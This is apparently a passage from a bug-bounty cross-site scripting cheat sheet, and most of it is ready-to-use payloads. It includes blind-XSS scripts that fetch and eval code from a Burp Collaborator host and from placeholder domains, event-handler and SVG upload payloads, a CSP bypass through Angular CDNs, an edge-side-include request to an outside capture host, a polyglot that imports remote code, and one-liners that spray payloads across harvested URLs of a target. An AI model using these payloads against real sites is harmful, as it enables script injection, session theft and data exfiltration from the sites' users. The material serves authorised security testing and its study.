<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"> 

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>


```


**XSS to SSRF**

Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include Injection with this payload

```javascript
<esi:include src="http://yoursite.com/capture" />

```

Use it to bypass cookie restrictions, XSS filters and much more!
More information about this technique here: https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations


**XSS in dynamic created PDF**

If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code.
So, if the PDF creator bot finds some kind of HTML tags, it is going to interpret them, and you can abuse this behaviour to cause a Server XSS.

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf

If you cannot inject HTML tags it could be worth it to try to inject PDF data:

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/pdf-injection


**XSS uploading files (svg)**

Upload as an image a file like the following one (from : https://ghostlulz.com/xss-svg/)

```javascript

Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(1);
   </script>
</svg>
-----------------------------232181429808--


```

```javascript
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">alert("XSS")</script>
</svg>

```

```javascript
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>

```


```javascript
<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
  </foreignObject>
</svg>

```




```javascript
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>

```


```javascript
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />

```

### Polygot
It’s a malicious payload meant to cover all places of reflection (DOM, reflected XSS, stored XSS). Here’s an example by @KNOXSS:

```javascript
JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<! →</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=14564/.source))}//\76 →
```
Make sure to inject that everywhere you have an on-input simple trick. Inject your payloads on the HTTP request, not on the browser, to bypass JavaScript regex and filters.

### Stored XSS by file upload
save this script as ( image.svg ) and upload it on every file upload option , if successful , try to find the path of the image , if you open the link of the image and execute , congrats you got an stored xss

```javascript
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('xss');
   </script>
</svg>
```

### Stored XSS on PDF.js CVE-2024–4367
This particular CVE works on applications that use PDF.js, a PDF viewer. Here’s what you need to do:

1. Whenever you see an app using this technology, upload a vulnerable PDF file
2. If you see any reflection while opening the file, you’ve got a stored XSS!

* [PDF Payloads](https://github.com/Mehdi0x90/Web_Hacking/blob/main/XSS-PDF%20Payloads/)


###  Reflected XSS (Non-Persistent XSS)
**Trick n°1:**

You go and browse the app normally , make sure to click every button you find ( while burp proxy is on ) , then you go to burp history section and do scoop only select only request with parameter and go to the request one by one and inject your payload on these urls , there a high chance you will find a reflected XSS.

**Trick n°2:**

XSS one liner

```javascript
# method 1
echo "target.com" | gauplus | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'

# method 2
echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'

# method 3
echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | while read url; do curl -s "$url" | awk '/"><img\//' && echo "Potential XSS at: $url"; done
```


## Automate XSS
* [dalfox](https://github.com/hahwul/dalfox) - DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters
```bash
# combined use of dalfox
python3 paramspider.py -d https://target.com -s TRUE -e ttf,woff,eot,svg,css | deduplicate | sed '1,4d' | httpx -silent | dalfox pipe -S | cut -d " " -f2
```

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

* [XSSTRON](https://github.com/RenwaX23/XSSTRON) - Powerful Chromium Browser to find XSS Vulnerabilites automatically while browsing web, it can detect many case scenarios with support for POST requests too

* [XSS-Radar](https://github.com/bugbountyforum/XSS-Radar) - XSS Radar is a tool that detects parameters and fuzzes them for cross-site scripting vulnerabilities
* [KNOXSS Community Edition by Brute Logic](https://addons.mozilla.org/en-US/firefox/user/12642480/) - This tool it will scan every URL you visit from reflected XSS , if its vulnerable it will pop up an alert(1) box ( make sure to turn the extension ON ) to make sure it scanning .















